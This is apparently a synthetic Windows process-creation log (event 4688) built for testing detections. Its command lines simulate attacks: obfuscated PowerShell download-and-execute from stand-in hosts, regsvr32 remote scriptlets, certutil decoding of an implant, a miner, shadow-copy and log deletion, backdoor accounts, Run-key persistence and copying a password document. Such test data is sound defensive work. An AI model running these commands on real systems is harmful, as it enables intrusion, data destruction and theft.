,TenantId,Account,EventID,TimeGenerated,Computer,SubjectUserSid,SubjectUserName,SubjectDomainName,SubjectLogonId,NewProcessId,NewProcessName,TokenElevationType,ProcessId,CommandLine,ParentProcessName,TargetLogonId,SourceComputerId,TimeCreatedUtc,NodeRole,Level,ProcessId1,NewProcessId1
0,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:15.677,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1580,C:\Diagnostics\UserTmp\ftp.exe,%%1936,0xbc8,.\ftp  -s:C:\RECYCLER\xxppyy.exe,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:15.677,source,0,,
1,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:16.167,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x16fc,C:\Diagnostics\UserTmp\reg.exe,%%1936,0xbc8,.\reg  not /domain:everything that /sid:shines is /krbtgt:golden !,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:16.167,sibling,1,,
2,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:16.277,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1700,C:\Diagnostics\UserTmp\cmd.exe,%%1936,0xbc8,"cmd  /c ""systeminfo && systeminfo""",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:16.277,sibling,1,,
3,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:16.340,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1728,C:\Diagnostics\UserTmp\rundll32.exe,%%1936,0xbc8,.\rundll32  /C 12345.exe,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:16.340,sibling,1,,
4,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:16.400,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x175c,C:\Diagnostics\UserTmp\rundll32.exe,%%1936,0xbc8,.\rundll32  /C c:\users\MSTICAdmin\12345.exe,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:16.400,sibling,1,,
5,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:16.430,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x176c,C:\Diagnostics\UserTmp\rundll32.exe,%%1936,0xbc8,.\rundll32  /C 1234.exe,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:16.430,sibling,1,,
6,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:16.500,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x17a0,C:\Diagnostics\UserTmp\rundll32.exe,%%1936,0xbc8,.\rundll32  /C c:\users\MSTICAdmin\1234.exe,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:16.500,sibling,1,,
7,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:16.510,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x17cc,C:\Diagnostics\UserTmp\rundll32.exe,%%1936,0xbc8,.\rundll32  /C reg.exe,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:16.510,sibling,1,,
8,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:16.563,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x143c,C:\Diagnostics\UserTmp\reg.exe,%%1936,0xbc8,.\reg.exe  add \hkcu\software\microsoft\some\key\Run /v abadvalue,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:16.563,sibling,1,,
9,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:16.613,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1064,C:\Diagnostics\UserTmp\tsetup.1.exe,%%1936,0xbc8,"c:\Diagnostics\UserTmp\tsetup.1.exe  C:\Users\MSTICAdmin\AppData\Local\Temp\2\is-01DD7.tmp\tsetup.1.0.14.tmp"" /SL5=""$250276,19992586,423424,C:\Users\MSTICAdmin\Downloads\tsetup.1.0.14.exe",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:16.613,sibling,1,,
10,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:16.663,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1434,C:\Diagnostics\UserTmp\rundll32.exe,%%1936,0xbc8,".\rundll32.exe  /C mshtml,RunHTMLApplication javascript:alert(tada!)",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:16.663,sibling,1,,
11,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:16.677,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0xbb4,C:\Diagnostics\UserTmp\netsh.exe,%%1936,0xbc8,".\netsh.exe  ""in (*.exe) do start # artificial commandline solely for purposes of triggering test""",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:16.677,sibling,1,,
12,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:16.720,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1404,C:\Diagnostics\UserTmp\cmd.exe,%%1936,0xbc8,".\cmd  /c ""cd /d ""C:\inetpub\wwwroot""&powershell Set-ExecutionPolicy RemoteSigned&echo [S]&cd&echo [E]""",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:16.720,sibling,1,,
13,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:16.767,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x148c,C:\Diagnostics\UserTmp\cmd.exe,%%1936,0xbc8,".\cmd  /c ""cd /d ""C:\inetpub\wwwroot""&powershell Enable-WSManCredSSP =2013Role Server -force&echo [S]&cd&echo [E]""",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:16.767,sibling,1,,
14,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:16.807,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1464,C:\Diagnostics\UserTmp\cmd.exe,%%1936,0xbc8,".\cmd  /c ""cd /d ""C:\inetpub\wwwroot""&powershell winrm set winrm/config/service/Auth @{Kerberos=003D""true""}&echo [S]&cd&echo [E]""",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:16.807,sibling,1,,
15,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:16.850,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x14b8,C:\Diagnostics\UserTmp\cmd.exe,%%1936,0xbc8,".\cmd  /c ""cd /d ""C:\ProgramData""&copy \\[REDACTED]\c$\users\[REDACTED]\Documents\""Password Change Dates.docx""",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:16.850,sibling,1,,
16,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:16.893,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x14ec,C:\Diagnostics\UserTmp\cmd.exe,%%1936,0xbc8,".\cmd  /c ""cd /d ""C:\inetpub\wwwroot""&c:\windows\system32\inetsrv\appcmd set config ""Default Web Site/"" /section:httplogging /dontLog:true&echo [S]&cd&echo [E]""",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:16.893,sibling,1,,
17,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:16.967,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x14f0,C:\Diagnostics\UserTmp\cmd.exe,%%1936,0xbc8,".\cmd  /c ""cd /d ""C:\inetpub\wwwroot""&del C:\inetpub\logs\logFiles\W3SVC1\*.log /q&echo [S]&cd&echo [E]""",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:16.967,sibling,1,,
18,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:17.020,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x14e8,C:\Diagnostics\UserTmp\perfc.dat,%%1936,0xbc8,c:\Diagnostics\UserTmp\perfc.dat ,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:17.020,sibling,1,,
19,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:17.077,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1564,C:\Diagnostics\UserTmp\sdopfjiowtbkjfnbeioruj.exe,%%1936,0xbc8,c:\Diagnostics\UserTmp\sdopfjiowtbkjfnbeioruj.exe ,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:17.077,sibling,1,,
20,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:17.127,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x155c,C:\Diagnostics\UserTmp\doubleextension.pdf.exe,%%1936,0xbc8,c:\Diagnostics\UserTmp\doubleextension.pdf.exe ,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:17.127,sibling,1,,
21,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:17.137,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1550,C:\Windows\System32\vssadmin.exe,%%1936,0xbc8,vssadmin  delete shadows /all /quiet,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:17.137,sibling,1,,
22,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:03.057,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x10cc,C:\Windows\System32\conhost.exe,%%1936,0xbc8,\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:03.057,sibling,1,,
23,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:03.247,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1288,C:\Windows\System32\cmd.exe,%%1936,0xbc8,cmd  /c echo Any questions about the commands executed here then please contact one of,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:03.247,sibling,1,,
24,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:03.257,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x3dc,C:\Windows\System32\cmd.exe,%%1936,0xbc8,cmd  /c echo timb@microsoft.com; romead@microsoft.com; ianhelle@microsoft.com; marcook@microsoft.com; dotanp@microsoft.com; liengli@microsoft.com,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:03.257,sibling,1,,
25,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:03.390,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x2a8,C:\Windows\System32\net.exe,%%1936,0xbc8,net  user adm1nistrator Bob_testing /add,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:03.390,sibling,1,,
26,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:03.503,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0xfc0,C:\Windows\System32\net.exe,%%1936,0xbc8,"net  share TestShare=c:\testshare /Grant:Users,Read",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:03.503,sibling,1,,
27,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:03.830,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0xcd8,C:\Windows\System32\net.exe,%%1936,0xbc8,net  use q: \\MSTICAlertsWin1\TestShare Bob_testing /User:adm1nistrator,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:03.830,sibling,1,,
28,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:08.723,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x12fc,C:\Windows\System32\net.exe,%%1936,0xbc8,net  use q: /delete,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:08.723,sibling,1,,
29,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:10.667,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0xc18,C:\Windows\System32\net.exe,%%1936,0xbc8,net  share TestShare /delete,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:10.667,sibling,1,,
30,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:10.707,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1274,C:\Windows\System32\net.exe,%%1936,0xbc8,net  user adm1nistrator /delete,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:10.707,sibling,1,,
31,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:10.753,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0xd10,C:\Diagnostics\UserTmp\regsvr32.exe,%%1936,0xbc8,.\regsvr32   /s /n /u /i:http://server/file.sct scrobj.dll,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:10.753,sibling,1,,
32,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:11.260,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x103c,C:\Diagnostics\UserTmp\suchost.exe,%%1936,0xbc8,.\suchost.exe   -a cryptonight -o bcn -u bond007.01 -p x -t 4,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:11.260,sibling,1,,
33,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:11.413,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0xbb4,C:\Diagnostics\UserTmp\cmd.exe,%%1936,0xbc8,"cmd  /c ""echo TVqQAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> delme.b64""",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:11.413,sibling,1,,
34,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:11.537,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x123c,C:\Diagnostics\UserTmp\cmd.exe,%%1936,0xbc8,"cmd  /c ""echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> delme.b64""",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:11.537,sibling,1,,
35,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:13.100,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x15b4,C:\Diagnostics\UserTmp\powershell.exe,%%1936,0xbc8,".\powershell.exe  -c ""$a = 'Download'+'String'+""(('ht'+'tp://paste'+ 'bin/'+'raw/'+'pqCwEm17'))"";$b = '(New-Object' + ' Net.WebClient)';'$b.$a' | Out-File .\evil.ps1;""",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:13.100,sibling,1,,
36,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:13.220,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x15e8,C:\Diagnostics\UserTmp\powershell.exe,%%1936,0xbc8,".\powershell  -c {IEX (New-Object Net.WebClient).DownloadString(('ht'+(""{2}{0}{1}""-f ':/','/paste','tp')+'bin/'+'raw/'+(""{1}{0}""-f'Em17','pqCw')));}",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:13.220,sibling,1,,
37,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:13.337,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x161c,C:\Diagnostics\UserTmp\cmd.exe,%%1936,0xbc8,"cmd  /c "".\pOWErS^H^ElL^.eX^e^ -^ExEc^Ut^IoNpOliCy BYpa^sS i^mPOr^T-^M^oDuLE biTsTr^ANSFe^R;^S^tar^t-bITSTRanS^fER -^SOURCE^ 'http://somedomain/best-kitten-names-1.jpg' ^-d^EStIN^At^IOn ^'C:\Users\$env:UserName\AppData\Local\Temp\kittens1.jpg';""",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:13.337,sibling,1,,
38,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:13.453,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1650,C:\Diagnostics\UserTmp\cmd.exe,%%1936,0xbc8,"cmd   /c "".\n^e^t u^se^r""",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:13.453,sibling,1,,
39,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:13.567,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1684,C:\Diagnostics\UserTmp\powershell.exe,%%1936,0xbc8,.\powershell  -enc JAB0ACAAPQAgACcAZABpAHIAJwA7AA0ACgAmACAAKAAnAEkAbgB2AG8AawBlACcAKwAnAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAnACkAIAAkAHQA,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:13.567,sibling,1,,
40,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:13.683,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x16b8,C:\Diagnostics\UserTmp\cmd.exe,%%1936,0xbc8,"cmd  /c ""echo # aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa >> blah.ps1""",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:13.683,sibling,1,,
41,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:13.793,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x16ec,C:\Diagnostics\UserTmp\cmd.exe,%%1936,0xbc8,"cmd  /c ""echo # aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa >> blah.ps1""",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:13.793,sibling,1,,
42,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:11.767,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0xa08,C:\Diagnostics\UserTmp\certutil.exe,%%1936,0xbc8,certutil  -decode delme.b64 implant.exe,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:11.767,sibling,1,,
43,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:11.947,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x240,C:\Diagnostics\UserTmp\implant.exe,%%1936,0xbc8,implant.exe  k111,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:11.947,sibling,1,,
44,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:12.003,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1250,C:\Diagnostics\UserTmp\implant.exe,%%1936,0xbc8,implant.exe  81ed03caf6901e444c72ac67d192fb9c,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:12.003,sibling,1,,
45,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:12.067,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x140c,C:\Diagnostics\UserTmp\implant.exe,%%1936,0xbc8,implant.exe  -b -t -m,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:12.067,sibling,1,,
46,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:12.123,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x142c,C:\Diagnostics\UserTmp\cmd.exe,%%1936,0xbc8,"cmd  /c ""echo Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://badguyserver/pwnme"" ",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:12.123,sibling,1,,
47,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:12.393,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x14ac,C:\Diagnostics\UserTmp\powershell.exe,%%1936,0xbc8,".\powershell  -Noninteractive -Noprofile -Command ""Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://badguyserver/pwnme""",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:12.393,sibling,1,,
48,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:12.513,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x14e0,C:\Diagnostics\UserTmp\powershell.exe,%%1936,0xbc8,.\powershell  Invoke-Shellcode.ps1,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:12.513,sibling,1,,
49,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:12.670,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1514,C:\Diagnostics\UserTmp\powershell.exe,%%1936,0xbc8,.\powershell  Invoke-ReverseDnsLookup.ps1,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:12.670,sibling,1,,
50,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:12.847,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x154c,C:\Diagnostics\UserTmp\powershell.exe,%%1936,0xbc8,".\powershell  -command ""(New-Object Net.WebClient).DownloadString(('ht'+'tp://pasteb' + 'bin/'+'raw/'+'pqCwEm17'));""",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:12.847,sibling,1,,
51,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:15.160,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1490,C:\Windows\System32\net.exe,%%1936,0xbc8,net  localgroup Administrators,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:15.160,sibling,1,,
